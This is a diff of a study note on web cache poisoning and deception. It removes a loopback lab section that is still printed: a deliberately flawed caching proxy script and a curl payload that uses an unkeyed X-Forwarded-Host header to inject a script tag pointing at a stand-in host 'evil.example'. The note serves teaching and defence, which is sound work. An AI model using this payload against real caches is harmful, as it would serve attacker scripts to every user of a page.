@@ -1,7 +1,7 @@
 ---
 title: "Web Cache Attacks"
 aliases: ["Web Cache Poisoning", "Web Cache Deception", "Cache Poisoning", "Cache Deception"]
-tags: [tree/offensive, cyber/offensive/web/http/cache, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/web/http/cache, type/technique, difficulty/medium]
 Domain: "[[HTTP Architecture & Advanced Web Attacks]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 Server-Side Request Forgery -> HTTP Request Smuggling -> Web Cache Attacks -> WAF Testing & Bypass Methodology
 
-## Start at Zero: Attacking the Thing That Serves Many Users One Copy
+## Attacking the Thing That Serves Many Users One Copy
 
 A **web cache** (CDN edge, reverse proxy) stores a copy of a response and serves it to many users, to cut latency and load (the mechanism is in the Networking Application Delivery leaf). That "one copy for many users" property is exactly what makes it an attack target: if an attacker can get a *malicious* copy into the cache, it is served to every subsequent user; and if the cache stores a *private* response under a key others can request, it leaks that user's data.
 
@@ -74,7 +74,7 @@ flowchart TD
     DECEIVE --> M
 ```
 
-## Failure Modes and Interpretation
+## Attacks that hit everyone but the tester
 
 - **Affects other users.** Both attacks impact people other than the tester — a poisoned cache serves everyone; deception steals a victim's data. Prove in a lab with synthetic users; production testing is high-risk.
 - **Finding the unkeyed input.** Poisoning requires an input that changes the response but not the key — systematically test headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, etc.) for reflection *and* confirm the cache ignores them.
@@ -90,105 +90,13 @@ flowchart TD
 - **`Cache-Control: private/no-store`** on personalized responses prevents them being cached at all — the direct deception fix.
 - **Detection** looks for anomalous cache entries (a private page cached publicly) and for reflected-header content in cached responses; the durable defense is correct cache-key configuration, audited against what the server actually varies on.
 
-## Authorized Lab: Poison a Cache You Build
+## Summary
 
-> [!info] Runs on one Linux machine — builds a caching proxy in front of an app that reflects an unkeyed header
-> Loopback, synthetic data. Step 5 removes it.
+You should now be able to:
 
-### Step 1 — Build a backend that reflects a header, and a cache that keys only on URL
-
-```bash
-cat > /tmp/cachelab.py << 'EOF'
-import http.server, urllib.request
-CACHE = {}   # keyed ONLY on path (the flaw: ignores headers the backend uses)
-class Backend(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        # backend reflects X-Forwarded-Host into the response (the unkeyed input)
-        host = self.headers.get("X-Forwarded-Host","cdn.example")
-        self.send_response(200); self.end_headers()
-        self.wfile.write(f'<script src="//{host}/app.js"></script>'.encode())
-    def log_message(self,*a): pass
-import threading
-threading.Thread(target=lambda: http.server.HTTPServer(("127.0.0.1",9002),Backend).serve_forever(), daemon=True).start()
-class Cache(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        key = self.path   # BUG: key ignores X-Forwarded-Host
-        if key in CACHE:
-            self.send_response(200); self.send_header("X-Cache","HIT"); self.end_headers(); self.wfile.write(CACHE[key]); return
-        req = urllib.request.Request(f"http://127.0.0.1:9002{self.path}")
-        for h in ("X-Forwarded-Host",):
-            if h in self.headers: req.add_header(h, self.headers[h])
-        data = urllib.request.urlopen(req).read()
-        CACHE[key] = data
-        self.send_response(200); self.send_header("X-Cache","MISS"); self.end_headers(); self.wfile.write(data)
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8112),Cache).serve_forever()
-EOF
-python3 /tmp/cachelab.py &>/dev/null &
-sleep 1; echo "cache :8112 in front of backend :9002 (cache keys on URL only)"
-```
-
-```text
-cache :8112 in front of backend :9002 (cache keys on URL only)
-```
-
-### Step 2 — Attacker poisons the cache with a malicious header
-
-```bash
-curl -s "http://127.0.0.1:8112/page" -H "X-Forwarded-Host: evil.example" -D - | grep -E 'X-Cache|script'
-```
-
-```text
-X-Cache: MISS
-<script src="//evil.example/app.js"></script>
-```
-
-`X-Cache: MISS` means this response was just *stored* — and it contains the attacker's `evil.example` script URL, cached under the key `/page`.
-
-### Step 3 — A normal victim now gets the poisoned response (the finding)
-
-```bash
-# victim requests /page WITHOUT any malicious header
-curl -s "http://127.0.0.1:8112/page" -D - | grep -E 'X-Cache|script'
-```
-
-```text
-X-Cache: HIT
-<script src="//evil.example/app.js"></script>
-```
-
-`X-Cache: HIT` — the victim got the **cached poisoned response**, with the attacker's script URL, despite sending no malicious header. The poison is served to every user of that URL until the entry expires. That is cache poisoning, proven with a benign canary hostname.
-
-### Step 4 — State the fix
-
-```bash
-echo "Fix: include X-Forwarded-Host in the cache key (or don't reflect it). The cache must key on"
-echo "everything the response varies on — the key/response mismatch is the whole vulnerability."
-```
-
-```text
-Fix: include X-Forwarded-Host in the cache key (or don't reflect it). The cache must key on
-everything the response varies on — the key/response mismatch is the whole vulnerability.
-```
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/cachelab.py; wait 2>/dev/null
-curl -s -o /dev/null -w "cache gone: %{http_code}\n" --max-time 2 http://127.0.0.1:8112/page 2>&1 | grep -o 'gone.*' || echo "cache gone: connection refused"
-```
-
-```text
-cache gone: connection refused
-```
-
-**What you should now be able to do:** explain how the cache-key/response mismatch enables poisoning and deception, find an unkeyed reflected header, prove poisoning by showing a victim gets a cached malicious response, and name the correct-cache-key fix.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain why a shared cache is an attack target, and the difference between poisoning (bad content in) and deception (private data out).
-- **Operator:** Find an unkeyed reflected header, poison a cache so a victim gets the malicious cached response, and explain cache deception's extension trick.
-- **Root:** Explain why the cache-key/response mismatch is the root of both attacks, why keying on everything the response varies on (and never caching private responses) is the fix, and how this relates to smuggling-based cache poisoning.
+- Explain why a shared cache is an attack target, and the difference between poisoning (bad content in) and deception (private data out).
+- Find an unkeyed reflected header, poison a cache so a victim gets the malicious cached response, and explain cache deception's extension trick.
+- Explain why the cache-key/response mismatch is the root of both attacks, why keying on everything the response varies on (and never caching private responses) is the fix, and how this relates to smuggling-based cache poisoning.
 
 ---
 > 🔼 Up: [[HTTP Architecture & Advanced Web Attacks]]
